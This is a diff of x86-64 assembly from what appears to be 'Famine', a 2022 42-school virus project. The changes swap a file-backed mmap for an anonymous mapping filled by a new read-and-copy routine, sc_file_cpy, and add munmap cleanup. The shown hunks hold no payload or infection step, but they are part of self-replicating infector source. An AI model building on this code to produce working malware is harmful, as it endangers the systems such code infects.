@@ -5,7 +5,7 @@ sc:
 				mov				rbp,					rsp
 
 				and				rsp,					0xfffffffffffffff0
-				mov				rbx,					14 * 8 + 3 * 1024
+				mov				rbx,					14 * 8 + 4 * 1024
 				sub				rsp,					rbx
 
 				push			rdi
@@ -477,14 +477,21 @@ sc_map_file:
 				mov				rdi,					0
 				mov				rsi,					rax
 				mov				rdx,					3
-				mov				r10,					2
-				mov				r8,						qword[rsp]
+				mov				r10,					0x22
+				mov				r8,						-1
 				mov				r9,						0
 				mov				rax,					9
 				syscall
 
 				cmp				rax,					-1
 				je				.err_close
+
+				mov				rdi,					rax
+				mov				rsi,					qword[rsp]
+				call			sc_file_cpy
+
+				cmp				rax,					0
+				jl				.munmap
 
 				mov				r8,						qword[rel sc_glob]
 				mov				qword[r8+0xc60],		rax
@@ -495,6 +502,12 @@ sc_map_file:
 
 				xor				rax,					rax
 				jmp				.end
+.munmap:
+				mov				r8,						qword[rel sc_glob]
+				mov				rdi,					qword[r8+0xc60]
+				mov				rsi,					qword[r8+0x18]
+				mov				rax,					11
+				syscall
 .err_close:
 				mov				rdi,					qword[rsp]
 				mov				rax,					3
@@ -502,6 +515,47 @@ sc_map_file:
 .error:
  				mov				rax,					-1
 .end:
+				mov				rsp,					rbp
+				pop				rbp
+				ret
+sc_file_cpy:
+				push			rbp
+				mov				rbp,					rsp
+
+				sub				rsp,					8	; i		0x10
+				push			rdi							; mem	0x8
+				push			rsi							; src	
+.loop_1:
+				mov				r8,						qword[rel sc_glob]
+
+				mov				rdi,					qword[rsp]
+				lea				rsi,					[r8+0xc88]
+				mov				rdx,					0x400
+				mov				rax,					0
+				syscall
+
+				cmp				rax,					0
+				jle				.end
+				
+				mov				qword[rsp+0x10],		0
+.loop_2:
+				cmp				qword[rsp+0x10],		rax
+				je				.loop_1
+
+				mov				r8,						qword[rel sc_glob]
+				lea				r8,						[r8+0xc88]
+				mov				r10,					qword[rsp+0x10]
+				mov				r9b,					byte[r8+r10]
+				mov				r10,					qword[rsp+0x8]
+				mov				byte[r10],				r9b
+
+				inc				qword[rsp+0x10]
+				inc				qword[rsp+0x8]
+				jmp				.loop_2
+.end:
+				pop				rsi
+				pop				rdi
+
 				mov				rsp,					rbp
 				pop				rbp
 				ret
@@ -661,6 +715,8 @@ sc_glob:
 									; +0xc70 -> real_entry
 									; +0xc78 -> child
 									; +0xc80 -> entry
+
+									; +0xc88 -> buffs.copy
 sc_sign:
 				db				"Famine (42 project) - 2022 - by apitoise & fcadet", 0
 sc_data_end:
